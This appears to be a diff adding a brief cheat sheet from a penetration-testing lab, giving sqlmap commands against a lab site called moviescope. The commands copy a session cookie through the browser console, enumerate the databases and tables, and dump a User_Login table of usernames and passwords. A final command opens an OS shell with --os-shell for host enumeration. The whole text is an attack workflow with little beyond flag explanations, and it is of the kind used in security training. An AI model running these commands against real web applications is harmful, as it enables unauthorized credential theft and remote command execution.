@@ -1,0 +1,26 @@
+Sqlmap * Linux 
+
+# UseCase: 
+[To perform Sql datbase Injection]
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+$ In the Developer Tab , Click on Console tab, type document.cookie [To get the Cookie value to be used in the Sqlmap tool]
+
+$ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#7]" --dbs 
+[-u specifies the target URL , --cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases]
+
+$ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables
+[-D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables]
+
+$ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump
+[sqlmap retrieves the complete User_Login table data from the database moviescope, containing all users' usernames under the Uname column and passwords under the password column]
+
+$ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell
+[--os-shell is the prompt for an interactive OS shell]
+
+$ Type hostname , Type TASKLIST [To enumerate]
+
+$ Type help [To view Commnads]
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
